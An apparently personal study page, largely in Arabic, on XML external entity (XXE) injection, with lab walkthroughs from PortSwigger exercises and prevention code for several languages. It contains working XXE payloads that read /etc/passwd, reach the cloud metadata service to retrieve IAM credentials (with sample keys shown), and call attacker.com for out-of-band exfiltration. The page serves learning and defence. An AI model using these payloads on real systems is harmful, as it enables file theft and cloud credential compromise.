# XML external entity (XXE) injection

- <details>
     <summary>XXE</summary>

     
     # XML external entity (XXE) injection
     
     في هذا الملف نشرح ما هو **XML external entity injection (XXE)**، نعرض أمثلة شائعة، نشرح كيفية العثور على الثغرة واستغلالها بأنواعها المختلفة، ونلخّص طرق الوقاية.
     
     > **تحذير**: الأمثلة والتعليمات هنا مخصّصة للأغراض التعليمية واختبار الأمن على بيئات قانونية (مختبرات PortSwigger / HTB / VM خاص بك). لا تستخدمها على أنظمة غير ملكك.
     
     ---
     
     ## 1) ما هو XXE باختصار
     
     **XML External Entity (XXE)** هو ثغرة تحدث عندما يعالج السيرفر بيانات XML ويقبل تعريفات DTD/Entities خارجية بدون تحقّق. المهاجم يقدر يعرف `ENTITY` مرتبط بملف أو URL، وبهذا يستطيع:
     
     * الاطّلاع على ملفات على ملفّ نظام السيرفر (file disclosure).
     * تنفيذ **Server-Side Request Forgery (SSRF)** للوصول إلى أنظمة داخلية يقدر التطبيق الوصول لها.
     * استخراج بيانات *out-of-band* (مثل DNS/HTTP callbacks) إلى نظام المهاجم.
     * التسبّب بأخطاء تكشف بيانات حسّاسة (error-based).
     
     ## 2) لماذا تحدث الثغرة؟
     
     لأن مكتبات ومعالجات XML الافتراضية تدعم خصائص مثل DTDs وExternal Entities، وفي كثير من التطبيقات لا يقوم المطوّرون بتعطيل هذه الميزات أو تأمينها.
     
     ## 3) أنواع هجمات XXE
     
     * **استرجاع الملفات مباشرة (Direct file retrieval)**: تعريف `ENTITY` يقرأ ملف محلي ويُدرَج في الاستجابة.
     * **SSRF عبر XXE**: تعريف `ENTITY` يوجّه إلى URL داخلي (مثلاً `http://127.0.0.1:8080/admin`).
     * **Blind OOB (DNS/HTTP callback)**: لا تعرض البيانات في الاستجابة لكن السيرفر يتصل بعنوان يتحكم فيه المهاجم لتسليم المحتوى.
     * **Error-based**: التلاعب بالـXML لإحداث خطأ يحتوي على بيانات حسّاسة.
     
     ## 4) أمثلة Payload )
     
     **تنبيه قوي:** استخدم الأمثلة في بيئات قانونية فقط.
     
     **File disclosure (بسيط):**
     
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>&xxe;</root>
     ```
     
     **SSRF (طلب HTTP داخلي):**
     
     ```xml
     <!DOCTYPE root [
       <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/secret">
     ]>
     <root>&xxe;</root>
     ```
     
     **Blind OOB (DNS/HTTP callback):**
     
     ```xml
     <!DOCTYPE root [
       <!ENTITY % remote SYSTEM "http://attacker.com/payload.dtd">
       %remote;
     ]>
     <root>&send;</root>
     ```
     
     `payload.dtd` على جهة المهاجم يمكن أن يعرّف ENTITY يرسل محتوى ملف إلى `attacker.com` أو يسبب DNS lookup فريد.
     
     ## 5) كيف تلاقي XXE )
     
     * ابحث عن نقاط إدخال تستقبل XML (APIs، SOAP، SAML assertions، RSS/Atom، file uploads).
     * جرّب إدخال نص يحتوي `<!DOCTYPE` — إذا ظهر خطأ متعلق بالـDTD فقد تكون نقطة دخول.
     * استخدم أدوات مثل Burp Repeater أو curl لإرسال الـpayloads.
     * لاختبارات OOB استخدم Burp Collaborator أو DNSLog أو خدمة DNS قابلة للتحكّم. أي callback يؤكّد وجود ثغرة blind XXE.
     * راقب السجلات لسلوك outgoing HTTP/DNS أثناء الاختبار.
     * استخدم أدوات أتمتة كـBurp Scanner أو Nuclei مع قوالب XXE، لكن اليدوي غالباً أقوى للحالات المعقدة.
     
     ## 6) استراتيجيات الاستغلال حسب النوع
     
     * **إذا كانت الاستجابة تعرض المحتوى مباشرة** → استخدم payloads لاسترجاع ملفات.
     * **إذا لم تظهر بيانات لكن تملك OOB** → استخدم DTD خارجي يطلب مورد على سيرفر المهاجم.
     * **إذا كان parser يمنع DTD لكن يسمح بالـentities** → جرّب تقنيات blind عبر الأخطاء أو التوقّعات الزمنية.
     * **إذا كان السيرفر يمنع تحميل موارد خارجية** → ابحث عن رسائل خطأ تفصّل أجزاء من الملف.
     
     ## 7) كيف تمنع XXE — خطوات عملية
     
     1. **تعطيل معالجة DTD والـExternal Entities** في parser (الأهم). أمثلة:
     
        * **Java (javax.xml):**
     
        ```java
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        ```
     
        * **.NET:**
     
        ```csharp
        XmlReaderSettings settings = new XmlReaderSettings();
        settings.DtdProcessing = DtdProcessing.Prohibit;
        ```
     
        * **Python:** استخدم مكتبة `defusedxml` بدلاً من معالجات XML الافتراضية غير الآمنة.
     
        * **PHP:** `libxml_disable_entity_loader(true);` — راجع التوثيق لأن بعض الدوال تغيّرت في الإصدارات الحديثة.
     
     2. **تحديث المكتبات**: استعمل نسخ parser آمنة ومحدّثة.
     
     3. **التحويل إلى JSON** إذا لم تكن تحتاج ميزات XML المعقّدة.
     
     4. **تقييد الشبكة والصلاحيات**: امنع التطبيق من إجراء طلبات خارجية أو قيّدها جدارياً، وشغّل الخدمة بصلاحيات محدودة.
     
     5. **التحقّق من المدخلات**: لا تعالج XML مباشرة من مصادر غير موثوقة دون تحقق.
     
     6. **مراقبة outgoing DNS/HTTP** وفعّل Logging/IDS.
     
     7. **اختبار أمني دوري**: ضمن فحص XXE ضمن الاختبارات الآلية واليدوية.
     
     ## 8) نصايح في الكود — أمثلة سريعة
     
     * **Java**: تعطيل DTD كما سلف.
     * **Python**: استخدم:
     
     ```python
     from defusedxml import ElementTree as ET
     root = ET.fromstring(user_xml)
     ```
     
     * **.NET**: منع DTD عبر `XmlReaderSettings`.
     
     ## 9) إشارات إنك معرض للثغرة
     
     * التطبيق يتعامل مع SOAP, SAML, RSS أو يقبل ملفات XML من المستخدمين.
     * وجود مكتبات معالجة XML قديمة.
     * سجلات تظهر محاولات تحميل موارد خارجية أثناء معالجة XML.
     
     
     
          
  </details>


<details>
     <summary>Exploiting XXE to retrieve files</summary>

# Exploiting XXE to retrieve files


---

## 1) الفكرة  
الهدف هو تعريف **كيان خارجي** (external entity) داخل `DOCTYPE` في الـXML بحيث تكون قيمته محتوى ملف محلي (مثلاً `/etc/passwd`) ثم استعمال هذا الكيان داخل عنصر من عناصر الـXML الذي يعالجه السيرفر. لو معالج الـXML يحلّ الكيانات الخارجية، سيستبدل `&xxe;` بمحتوى الملف ويُرجِع هذا المحتوى في الاستجابة — وبكده نطلع الملف.

---

## 2) المثال الأصلي (قبل التعديل)
التطبيق بيبعت XML للسيرفر للتحقّق من حالة المنتج مثلاً:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
   <productId>381</productId>
</stockCheck>
```

---

## 3) الـPayload المستخدم للاستغلال
نعدل الـXML بحيث نضيف `DOCTYPE` ونعرف `ENTITY` من ملف النظام ثم نستخدمه داخل `<productId>`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
   <productId>&xxe;</productId>
</stockCheck>
```

**شرح سريع للسطرين المهمين:**
- `<!DOCTYPE foo [...]>`: إعلان DTD داخلي يسمح بتعريف كيانات داخل القوسين.  
- `<!ENTITY xxe SYSTEM "file:///etc/passwd">`: نعرّف كيان اسمه `xxe` وقيمته تأتي من ملف `/etc/passwd`.  
- في مكان `<productId>` نستخدم `&xxe;` علشان يتبدل بمحتوى الملف عند المعالجة.

---

## 4) النتيجة المتوقعة لو الاستغلال نجح
لو السيرفر يطبع قيمة `productId` داخل رسالة أو في الاستجابة، ومُعالج الـXML يسمح بتحميل الكيانات، ستبدو الاستجابة مثل:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## 5) لماذا الاستغلال ده ينجح تقنيًا
- مواصفة XML تدعم DTDs والكيانات (`<!ENTITY>`).  
- بعض معالجات XML تسمح بكيانات خارجية (`SYSTEM URI`) وتحملها من نظام الملفات أو شبكات.  
- إذا لم يقُم المطورون بتعطيل DTD/الكيانات أو تقييد صلاحيات العملية، المعالج سيجلب الملف ويضع محتواه مكان الـentity.

---

## 6) حالات يفشل فيها الاستغلال
- parser مُعدّ لتعطيل DTD/الكيانات (مثلاً `disallow-doctype-decl = true`).  
- صلاحيات العملية تمنع القراءة من مسارات النظام (sandbox / chroot / limited user).  
- التطبيق **لا يعيد** (لا يطبع) قيم الإدخال في الاستجابة أو يعالجها داخلياً بدون إظهارها.  
- هناك فلترة تزيل `<!DOCTYPE` أو تحظر URIs مثل `file:///`.  
- السيرفر يقوم بتحويل XML بطريقة تفصل أو تمنع توسعة الكيانات (مثلاً parsing آمن أو تحويل إلى JSON مبكّر).

---

## 7) Variations مفيدة للمعرفة
- **SSRF عبر XXE**: بدل `file:///` تضع `http://127.0.0.1:8000/secret` فتجبر السيرفر على طلب خدمة داخلية.  
- **Blind OOB (DNS/HTTP callback)**: لو الاستجابة لا تكشف الملف، تقدر تستخدم DTD خارجي يجبر السيرفر يتصل لنطاق تملكه (مثل Burp Collaborator) وترصده لالتقاط البيانات.  
- **Error-based extraction**: تصنع خطأ parsing ينتج رسالة خطأ تحوي بيانات حساسة.

---

## 8) كيف تكشف الثغرة أثناء اختبار أمني
- جرّب إدخال `<!DOCTYPE` أو payloads بسيطة وشوف الاستجابة والأخطاء.  
- استخدم أدوات OOB مثل Burp Collaborator أو خدمات DNSLog لمراقبة أي اتصالات صادرة عند تجربة DTD خارجي.  
- راجع سجلات الخادم: طلبات DNS أو HTTP الصادرة، وأخطاء parser أثناء المعالجة.  
- استخدم Burp Repeater لإعادة بناء الطلبات يدويًا — الأتمتة مفيدة لكن اليدوي في حالات XXE غالبًا أفضل.

---

## 9) كيفية الوقاية (أفضل ممارسات)
1. **عطّل DTD وExternal Entities في الـXML parser** — أهم إجراء:  
   - Java (مثال):
   ```java
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```
   - Python:
   ```python
   from defusedxml import ElementTree as ET
   root = ET.fromstring(user_xml)
   ```
   - .NET:
   ```csharp
   XmlReaderSettings settings = new XmlReaderSettings();
   settings.DtdProcessing = DtdProcessing.Prohibit;
   ```
   - PHP: راجع توثيق `libxml_disable_entity_loader` وتحديثات الإصدارات الحديثة.
2. **شغّل التطبيق بأقل الصلاحيات** ومنع الوصول غير الضروري لملفات النظام.  
3. **قيّد الاتصالات الصادرة** من الخادم (جدار ناري، قواعد شبكة داخلية).  
4. **افضل لتحويل البيانات**: لو JSON يكفي بدّل XML إلى JSON.  
5. **مراقبة Logging/IDS** للاتصالات الصادرة (DNS/HTTP) والتنبيهات.  
6. **تحديث المكتبات** وإدراج فحوص XXE ضمن الاختبارات الدورية.

---

## 10) خاتمة وتنبيه قانوني
المثال السابق هو حالة تعليمية قوية لاختبار XXE في بيئات مُصرّح بها (مختبرات مثل PortSwigger أو بيئة VM خاصة بك). استخدام الطرق دي على أنظمة غير مصرح لك بفحصها هو اختراق جرمي — لا تعمل ده إلا في بيئة قانونية.

---

إذا تحب، أقدر أعمل لك:
- ملف Markdown جاهز للتحميل (أحطه دلوقتي).  
- أو نحلّ lab عملي سوا خطوة بخطوة (Burp Repeater + Burp Collaborator) داخل بيئة اختبار آمنة — قلّي تختار إيه.




     
</details>


















---


<details>
     <summary>Lab: Exploiting XXE using external entities to retrieve files</summary>

1. navigate products and choose one of them then cick **`check stock`**

<img width="921" height="581" alt="image" src="https://github.com/user-attachments/assets/f6fc78c2-2aae-414a-8258-7549344143ae" />

2. we find this `XML`

```html
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
     <productId>2</productId>
     <storeId>1</storeId>
  </stockCheck>
```

<img width="1411" height="786" alt="image" src="https://github.com/user-attachments/assets/14875164-d4d9-4b66-ae80-c196e1b9cc98" />


3. now try to get content of **`/etc/passwd`**

```html
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
```

<img width="1420" height="715" alt="image" src="https://github.com/user-attachments/assets/f7ec8761-39da-4e2f-ac2c-5f0139977199" />


     
</details>















<details>
     <summary>Lab: Exploiting XXE to perform SSRF attacks</summary>

1. navigate products and choose one of them then cick **`check stock`**

<img width="921" height="581" alt="image" src="https://github.com/user-attachments/assets/f6fc78c2-2aae-414a-8258-7549344143ae" />

2. we find this `XML`

```html
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
     <productId>2</productId>
     <storeId>1</storeId>
  </stockCheck>
```

<img width="1411" height="786" alt="image" src="https://github.com/user-attachments/assets/14875164-d4d9-4b66-ae80-c196e1b9cc98" />


3. now try to Do ssrf attack

```html
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
   <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
```

<img width="1451" height="720" alt="image" src="https://github.com/user-attachments/assets/a64dda95-439e-4337-8d69-bcc16d70277c" />

```
"Invalid product ID: latest"
```

## let's try 

```html
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
   <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
```


`found`

```
"Invalid product ID: meta-data"
```

## try again 

```html
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/meta-data"> ]>
   <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
```

> ## untill reach  

```html
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
   <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
```

**`output`**

```

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-09-27T16:39:23.945563032Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ddHGhchWgerX7KM3G1S5",
  "SecretAccessKey" : "JT2GggMKVTJnqBcug4RviThUhQC3Z21ZMfjPKBFb",
  "Token" : "Fxpj4BARs6E098texzKOeSL9GyLIMz6acyEhzzk4HZ3JDLJ2PHv3jZutSWgBXvIKa70LHRwEhFwqzAunvngn1FbTbg6kKTq8M6i1jzEkoCOfrlTiY0urPhRHy5FIQhLVZym9J6B8rlGXiBWPr5RQGnplWqTeRs7fj1NWhsT7wECTU1dGfg0lZpYuAXoERPi9ZRFqLtaPGHI1ijpB8uZclPBgaI7wTcmFmyMU90J9X0vDm8Hlsj5LiAW7pVZlZEsQ",
  "Expiration" : "2031-09-26T16:39:23.945563032Z"
}"
```


<img width="1463" height="700" alt="image" src="https://github.com/user-attachments/assets/c232d26c-f012-4bfd-9590-de12a1bc4e77" />



     
</details>



<details>
     <summary>Lab: Blind XXE with out-of-band interaction</summary>



1. navigate products and choose one of them then cick **`check stock`**

<img width="921" height="581" alt="image" src="https://github.com/user-attachments/assets/f6fc78c2-2aae-414a-8258-7549344143ae" />

2. we find this `XML`

```html
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
     <productId>2</productId>
     <storeId>1</storeId>
  </stockCheck>
```

<img width="1411" height="786" alt="image" src="https://github.com/user-attachments/assets/14875164-d4d9-4b66-ae80-c196e1b9cc98" />

3. eidt request to to out of band xml 

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
  <stockCheck>
     <productId>&xxe;</productId>
     <storeId>1</storeId>
  </stockCheck>
```


<img width="1512" height="651" alt="image" src="https://github.com/user-attachments/assets/d60aec77-56b8-48b1-bf64-722791c23bfc" />




     
</details>




































